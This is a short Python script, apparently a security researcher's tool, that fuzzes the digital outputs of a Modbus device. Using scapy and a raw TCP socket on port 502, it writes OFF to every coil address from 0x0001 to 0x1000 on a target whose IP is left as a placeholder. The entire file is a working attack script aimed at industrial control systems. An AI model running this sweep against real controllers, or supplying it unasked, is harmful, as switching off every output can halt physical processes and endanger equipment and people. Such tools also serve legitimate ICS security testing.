# written by peenoise (Jay Turla)
# DO fuzzer

from scapy.all import *
import socket

# Function to send Modbus request for a specific address
def send_modbus_request(addr):
    class Modbus(Packet):
        name = 'Modbus'
        fields_desc = [
            XShortField("transId", int('17', 16)),       # Unique transaction ID
            XShortField("protoId", int('0000', 16)),
            ShortField("len", int('6', 16)),
            XByteField("unitId", int('1', 16)),
            XByteField("funcCode", int('5', 16)),        # Function code 5 to write to a single coil
            XShortField("outputAddr", int(addr, 16)),    # Address for DO to fuzz
            XShortField("outputValue", int('0000', 16))  # Value to write (turn OFF the DO)
        ]

    pkt = Modbus()
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    server_address = ('IP', 502)  # Your Modbus server IP
    sock.connect(server_address)
    sock.sendall(bytes(pkt))
    data = sock.recv(1024)
    sock.close()
    return data

# Loop through the address range and send the Modbus request
for addr in range(0x0001, 0x1001):  # Loop from 0x0001 to 0x1000
    addr_hex = format(addr, '04x')  # Convert the address to a 4-digit hex string
    response = send_modbus_request(addr_hex)
    print(f"RX for address {addr_hex}: {response}")
